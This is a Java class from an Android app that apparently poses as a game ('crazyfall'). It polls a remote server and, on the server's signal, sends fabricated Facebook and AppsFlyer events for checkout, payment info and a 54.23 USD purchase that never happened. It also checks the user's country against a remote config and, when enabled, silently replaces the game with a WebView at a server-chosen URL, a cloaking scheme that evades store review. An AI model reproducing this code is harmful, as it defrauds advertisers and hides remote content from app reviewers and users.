package com.fall.crazyfall.web;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.util.Log;

import com.android.volley.Request;
import com.android.volley.toolbox.JsonObjectRequest;
import com.appsflyer.AFInAppEventType;
import com.appsflyer.AppsFlyerLib;
import com.appsflyer.attribution.AppsFlyerRequestListener;
import com.facebook.appevents.AppEventsConstants;
import com.facebook.appevents.AppEventsLogger;
import com.fall.crazyfall.MainActivity;
import com.fall.crazyfall.StaticData;

import org.json.JSONException;

import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import androidx.annotation.NonNull;

import static com.facebook.FacebookSdk.getApplicationContext;
import static java.lang.Thread.sleep;

public class WebCommunication {
    private String gitUrl = "";
    private final Context context;
    private final SharedPreferences myPreferences;
    private final MainActivity activity;
    private final ExecutorService executor = Executors.newSingleThreadExecutor();
    private String hash = "";
    private boolean isNotStopCycle = true;
    private final SharedPreferences.Editor myEditor;
    private String deep;
    private String geo;


    public WebCommunication(Context context, SharedPreferences myPreferences, MainActivity activity, SharedPreferences.Editor myEditor, String deep) {
        this.context = context;
        this.myPreferences = myPreferences;
        this.activity = activity;
        this.myEditor = myEditor;
        this.deep = deep;
    }

    public void regEvent() {
        char[] chars = "abcdefghijklmnopqrstuvwxyz".toCharArray();
        StringBuilder sb = new StringBuilder(21);
        Random random = new Random();
        for (int i = 0; i < 21; i++) {
            char c = chars[random.nextInt(chars.length)];

            sb.append(c);
        }
        hash = myPreferences.getString("Hash", sb.toString());
        myEditor.putString("Hash" , hash);
        String eventUrl = "http://sayyespro.com/event?app_id=" + context.getPackageName() + "&hash=" + hash + "&sender=android_request";
        Log.e("deep", " json data " + eventUrl);
        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest
                (Request.Method.GET, eventUrl, null,
                        response -> {
                            try {
                                AppEventsLogger logger = AppEventsLogger.newLogger(context);

                                if (response.get("reg").toString().equals("1")) {
                                    if (myPreferences.getBoolean("reg", true)) {
                                        sendAppsflyeraddInfo();
                                        Log.e("reg send", " sent eevent reg" + response.toString());
                                        myEditor.putBoolean("reg", false);
                                        myEditor.apply();
                                        Bundle params = new Bundle();
                                        params.putString(AppEventsConstants.EVENT_PARAM_CURRENCY, "USD");
                                        params.putString(AppEventsConstants.EVENT_PARAM_CONTENT, "id : 1234");
                                        logger.logEvent(AppEventsConstants.EVENT_NAME_INITIATED_CHECKOUT,
                                                54.23,
                                                params);
                                    }
                                }
                                if (response.get("dep").toString().equals("1")) {
                                    Log.e("Logs", "don`t show deep ");
                                    if (myPreferences.getBoolean("dep", true)) {
                                        sendAppsflyeraddPurs();
                                        Log.e("Logs", " Deep event send");
                                        myEditor.putBoolean("dep", false);
                                        myEditor.apply();
                                        Bundle params = new Bundle();
                                        params.putString(AppEventsConstants.EVENT_PARAM_CURRENCY, "USD");
                                        params.putString(AppEventsConstants.EVENT_PARAM_CONTENT_TYPE, "product");
                                        params.putString(AppEventsConstants.EVENT_PARAM_CONTENT, "3456");
                                        logger.logEvent(AppEventsConstants.EVENT_NAME_ADDED_PAYMENT_INFO,
                                                54.23,
                                                params);
                                    }
                                }
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }, error -> Log.e("error git ", error.toString()));
        executor.execute(() -> {
            while (isNotStopCycle) {
                try {
                    //noinspection BusyWait
                    sleep(700);
                    Log.d(" Hash : ", "Hash is : " + hash);
                    MySinglton.getInstance(context).addToRequestQueue(jsonObjectRequest);
                    if (!myPreferences.getBoolean("reg", true) && !myPreferences.getBoolean("dep", true)) {
                        isNotStopCycle = false;
                        break;
                    }
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });
    }

    private void sendAppsflyeraddPurs() {
        AppsFlyerLib.getInstance().setDebugLog(true);
        Map<String,Object> buys = new HashMap<>();
        AppsFlyerLib.getInstance().logEvent(getApplicationContext(), AFInAppEventType.PURCHASE, buys, new AppsFlyerRequestListener() {
            @Override
            public void onSuccess() {
                Log.d("LOG_TAG", "PURCHASE Event sent successfully");
            }
            @Override
            public void onError(int i, @NonNull String s) {
                Log.d("LOG_TAG", "Event failed to be sent:\n" +
                        "Error code: " + i + "\n"
                        + "Error description: " + s);
            }
        });
    }

    private void sendAppsflyeraddInfo() {
        AppsFlyerLib.getInstance().setDebugLog(true);
        Map<String,Object> addInfo = new HashMap<>();
        AppsFlyerLib.getInstance().logEvent(getApplicationContext(), AFInAppEventType.ADD_PAYMENT_INFO, addInfo, new AppsFlyerRequestListener() {
            @Override
            public void onSuccess() {
                Log.d("LOG_TAG", "ADD_PAYMENT_INFO Event sent successfully");
            }
            @Override
            public void onError(int i, @NonNull String s) {
                Log.d("LOG_TAG", "Event failed to be sent:\n" +
                        "Error code: " + i + "\n"
                        + "Error description: " + s);
            }
        });
    }

    public void getGeo() {
        if (myPreferences.getBoolean("Web", false)) {
            JsonObjectRequest jsonObjectRequest = new JsonObjectRequest
                    (Request.Method.GET, StaticData.URL.getData(), null,
                            response -> {
                                try {
                                    gitUrl = response.get("Links").toString();
                                    Log.e("tag", "git urli " + gitUrl);
                                    glueDeepLink(deep);
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                            }, error -> Log.e("error git ", error.toString()));
            MySinglton.getInstance(context).addToRequestQueue(jsonObjectRequest);
        } else {
            JsonObjectRequest jsonObjectRequestLoc = new JsonObjectRequest
                    (Request.Method.GET, "http://www.geoplugin.net/json.gp?ip={$ip}", null,
                            response -> {
                                try {
                                    geo = response.get("geoplugin_countryCode").toString();
                                    startVebCommunication();
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                            }, error -> Log.e("error git ", error.toString()));
            MySinglton.getInstance(context).addToRequestQueue(jsonObjectRequestLoc);
        }
    }

    private void startVebCommunication() {
        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest
                (Request.Method.GET, StaticData.URL.getData(), null,
                        response -> {
                            try {
                                if ((response.get("Active").toString().equals("true")
                                        && response.get("countries").toString().toUpperCase().contains(geo))
                                        | (response.get("Active").toString().equals("true")
                                        && response.get("countries").toString().toUpperCase().equals("ALL"))) {
                                    saveWebState();
                                    gitUrl = response.get("Links").toString();
                                    Log.e("tag", "git urli " + gitUrl);
                                    glueDeepLink(deep);
                                }
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }, error -> Log.e("error git ", error.toString()));
        MySinglton.getInstance(context).addToRequestQueue(jsonObjectRequest);
    }

    private void saveWebState() {
        myEditor.putBoolean("Web", true);
        myEditor.apply();
    }

    private void glueDeepLink(String deepLink) {
        MainActivity.isGame = false;
        deep = myPreferences.getString("Link", deepLink);
        if (gitUrl.contains("?")) {
            gitUrl += "&" + deepLink +"&hash=" + hash + "&app_id=" + context.getPackageName();
        } else {
            gitUrl += "?"  + deepLink +"&hash=" + hash + "&app_id=" + context.getPackageName();
        }
        Intent intent = new Intent(context, Web.class);
        intent.putExtra("Links", gitUrl);
        myEditor.putString("Link", deep);
        myEditor.apply();
        context.startActivity(intent);
        activity.finish();
    }
}